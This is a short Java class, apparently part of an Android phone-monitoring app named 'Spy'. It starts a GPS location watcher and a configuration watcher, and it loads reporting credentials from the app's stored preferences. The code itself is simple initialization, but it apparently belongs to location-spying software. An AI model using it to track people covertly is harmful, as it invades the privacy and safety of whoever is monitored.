package org.ddth.android.spy;

import org.ddth.android.monitor.core.AndroidDC;
import org.ddth.android.monitor.observer.AndroidGpsWatcher;
import org.ddth.mobile.monitor.core.Watcher;

import android.content.Context;
import android.content.SharedPreferences;


/**
 * @author khoanguyen
 */
public class Spy {
	
	private static Spy instance = new Spy();
	
	public static Spy getInstance() {
		return instance;
	}
	
	private Watcher androidGpsWatcher;
	private Watcher spyingConfiguratingWatcher;

	private Spy() {
	}
	
	public void initialize(AndroidDC dc) {
		if (androidGpsWatcher == null) {
			androidGpsWatcher = new AndroidGpsWatcher();
			androidGpsWatcher.start(dc);
		}
		if (spyingConfiguratingWatcher == null) {
			spyingConfiguratingWatcher = new SpyingConfiguratingWatcher();
			spyingConfiguratingWatcher.start(dc);
		}
		SharedPreferences settings = dc.getContext().getSharedPreferences(SpyReporter.APPLICATION_TAG, Context.MODE_PRIVATE);
		SpyReporter.setCredentials(
				settings.getString(SpyReporter.USERNAME_FIELD, ""),
				settings.getString(SpyReporter.PASSWORD_FIELD, ""));
	}
}
